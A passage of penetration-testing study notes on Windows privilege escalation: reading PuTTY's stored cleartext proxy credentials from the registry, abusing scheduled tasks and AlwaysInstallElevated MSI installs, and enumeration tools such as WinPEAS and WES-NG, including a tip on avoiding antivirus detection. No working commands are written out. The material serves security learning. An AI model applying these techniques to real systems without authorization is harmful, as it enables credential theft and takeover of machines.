		- C:\Windows\Microsoft.NET\Framework64\v.4.0.30319\Config\web.config
	- **Retrieve Credentials from Software: PuTTY** - PuTTY is an SSH client commonly found on Window systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials. To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
![[Pasted image 20260302110035.png]]
- **Other Quick Wins**
	- Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
	- **AlwaysInstallElevated** - Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allows us to generate a malicious MSI file that would run with admin privileges. 
- **Tools of the Trade** - Several These tools can shorted the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
- Below are a few tools commonly used to identify privilege escalation vectors.
	- **WinPEAS** - WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. WinPEAS can be downloaded here: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
	- **PrivescCheck** - PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file. PrivescCehck can be downloaded here: https://github.com/itm4n/PrivescCheck
	- **Wes-NG: Windows Exploit Suggester - Next Generation** - Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine. WES-NG is a Python script that can be found and downloaded here: https://github.com/bitsadmin/wesng
	- **Metaploit** - If you already have a Meterpreter shell on the target system, you can use the **multi/recon/local_exploit_suggester** module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
- Additional techniques can be found here:
	- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	- https://github.com/gtworek/Priv2Admin
	- https://github.com/antonioCoco/RogueWinRM
	- https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
	- https://decoder.cloud/
	- https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
	- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation